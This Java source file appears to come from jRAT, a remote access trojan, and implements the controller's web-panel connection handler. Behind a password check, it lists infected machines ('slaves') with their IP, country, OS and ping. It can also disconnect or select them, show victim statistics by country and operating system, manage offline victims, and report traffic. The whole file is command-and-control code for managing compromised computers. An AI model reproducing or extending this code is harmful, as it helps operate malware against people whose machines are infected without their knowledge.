package se.jrat.controller.webpanel;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

import com.redpois0n.graphs.utils.DataUnits;

import se.jrat.common.exceptions.AuthenticationException;
import se.jrat.common.utils.MathUtils;
import se.jrat.controller.AbstractSlave;
import se.jrat.controller.Constants;
import se.jrat.controller.Main;
import se.jrat.controller.OfflineSlave;
import se.jrat.controller.exceptions.CloseException;
import se.jrat.controller.settings.StatisticsCountry;
import se.jrat.controller.settings.StatisticsCountry.CountryStatEntry;
import se.jrat.controller.settings.StatisticsOperatingSystem;
import se.jrat.controller.settings.StatisticsOperatingSystem.OperatingSystemStatEntry;
import se.jrat.controller.settings.StoreOfflineSlaves;
import se.jrat.controller.threads.NetworkCounter;

public class WebPanelConnection implements Runnable {

	private WebPanelListener parent;
	private Socket socket;
	private BufferedReader br;
	private BufferedWriter bw;

	/**
	 * Constructs new connection and handle incoming packets
	 * @param parent The parent socket listener
	 * @param socket The raw socket
	 * @throws Exception
	 */
	public WebPanelConnection(WebPanelListener parent, Socket socket) throws Exception {
		this.parent = parent;
		this.socket = socket;
		this.br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		this.bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
	}

	@Override
	public void run() {
		try {
			String pass = readLine();

            if (!pass.equals(parent.getHashedPassword())) {
                throw new AuthenticationException("Failed to auth, got password " + pass);
            }

            int packet;
            while ((packet = readNumber()) != -1) {
            	if (packet == WebPanelPackets.PACKET_LIST) {
                	StringBuilder sb = new StringBuilder();
                	
                	for (AbstractSlave slave : Main.connections) {
                		String[] data = new String[] {        
                			slave.getID(),
                			slave.getUniqueId() + "",
                			slave.isSelected() + "",
                			slave.getCountry(),
                			slave.getDisplayName(),
                			slave.getOperatingSystem().getDisplayString() + " " + slave.getOperatingSystem().getArch().getName(),
                			slave.getIP(),
                			Constants.NAME + " " + slave.getVersion(),
                			slave.getPing() + "",
                		};
                		
                		for (String e : data) {
                			sb.append(e + ":");
                		}
                		
                		sb.append(";");
                	}
                	
                	bw.write(sb.toString() + "\n");
                	bw.flush();
                } else if (packet == WebPanelPackets.PACKET_DISCONNECT) {
                	int slaves = readNumber();
                	
                	for (int i = 0; i < slaves; i++) {
                		int l = readNumber();
                		AbstractSlave slave = AbstractSlave.getFromId(l);
                		slave.closeSocket(new CloseException("Closed by webpanel"));
                	}
                } else if (packet == WebPanelPackets.PACKET_LISTCOUNTRIES) {
                	StringBuilder sb = new StringBuilder();

                	for (int i = 0; i < StatisticsCountry.getGlobal().getList().size(); i++) {
            			CountryStatEntry entry = StatisticsCountry.getGlobal().getList().get(i);
            			try {            				
            				sb.append(entry.getCountry() + "," + entry.getConnects());
            				sb.append(";");
            			} catch (Exception ex) {
            				ex.printStackTrace();
            			}
                	}
                	
                	bw.write(sb.toString() + "\n");
                	bw.flush();
                } else if (packet == WebPanelPackets.PACKET_LISTOPERATINGSYSTEMS) {
                	StringBuilder sb = new StringBuilder();

                	for (int i = 0; i < StatisticsOperatingSystem.getGlobal().getList().size(); i++) {
            			OperatingSystemStatEntry entry = StatisticsOperatingSystem.getGlobal().getList().get(i);
            			try {            				
            				sb.append(entry.getOperatingSystem().getDisplayString() + "," + entry.getConnects());
            				sb.append(";");
            			} catch (Exception ex) {
            				ex.printStackTrace();
            			}
                	}
                	
                	bw.write(sb.toString() + "\n");
                	bw.flush();
                } else if (packet == WebPanelPackets.PACKET_SELECT) {
                	String id = readLine();
                	boolean b = readLine().equalsIgnoreCase("true");
                	
                	boolean all = id.equals("all");
                	
                	if (!all) {
                		int i = -1;
                		try {
							i = Integer.parseInt(id);				
						} catch (Exception e) {

						}
                		
                		if (i == -1) {
                			continue;
                		}
                		
            			AbstractSlave slave = AbstractSlave.getFromId(i);

                		if (slave != null) {
                			slave.setSelected(b);
                		}               		          		
                	} else {
                		for (AbstractSlave slave : Main.connections) {
                			slave.setSelected(b);
                		}
                	}
                	
                	Main.instance.repaint();
                } else if (packet == WebPanelPackets.PACKET_LISTOFFLINE) {            	
                	StringBuilder sb = new StringBuilder();
                	for (OfflineSlave os : StoreOfflineSlaves.getGlobal().getList()) {
                		if (!os.isOnline()) {
                			sb.append(os.getString() + ";");
                		}
                	}
                	
                	bw.write(sb.toString() + "\n");
                	bw.flush();
                } else if (packet == WebPanelPackets.PACKET_REMOVE_OFFLINE) {
                	int id = readNumber();
                	
                	StoreOfflineSlaves.getGlobal().remove(id);
                } else if (packet == WebPanelPackets.PACKET_SERVER_INFO) {
                	StringBuilder sb = new StringBuilder();
                	
                	int diff = (int) (System.currentTimeMillis() - Main.START_TIME);
                	
					String[] data = new String[] {
							MathUtils.getTimeFromSeconds(diff / 1000),
							DataUnits.getAsString(NetworkCounter.currentIn) + "/s down, " + DataUnits.getAsString(NetworkCounter.currentOut) + "/s up",
							DataUnits.getAsString(NetworkCounter.totalIn) + " total down, " + DataUnits.getAsString(NetworkCounter.totalOut) + " total up",
					};

					for (String e : data) {
						sb.append(e + ";");
					}
                	
                	bw.write(sb.toString() + "\n");
                	bw.flush();
                }
            }

			socket.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	/**
	 * Reads line from socket and trim()'s it
	 * @return Trimmed string
	 * @throws IOException
	 */
	public String readLine() throws IOException {
		return br.readLine().trim();
	}

	/**
	 * Reads number from socket
	 * @return The number as integer
	 * @throws IOException
	 */
	public int readNumber() throws IOException {
		return Integer.parseInt(readLine());
	}
}
